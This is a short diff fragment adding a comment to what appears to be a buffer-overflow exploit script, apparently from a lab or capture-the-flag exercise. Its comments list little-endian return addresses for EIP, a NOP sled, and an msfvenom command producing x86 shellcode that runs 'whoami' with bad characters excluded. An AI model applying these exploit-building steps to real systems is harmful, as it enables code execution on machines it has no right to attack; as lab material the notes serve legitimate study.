@@ -51,6 +51,7 @@
         0xf7|f6|45|fb -> "\xfb\x45\xf6\xf7"
         0xf7|f6|46|0f -> "\x0f\x46\xf6\xf7"
     ###
+    # add one coverted to little indian to eip
     # add nop = "\x90" * 15
     # make payload, fix print(), and run payload
     # msfvenom -p linux/x86/exec CMD=whoami -b '\x00\xfe\x20\x0a\xff' -f python
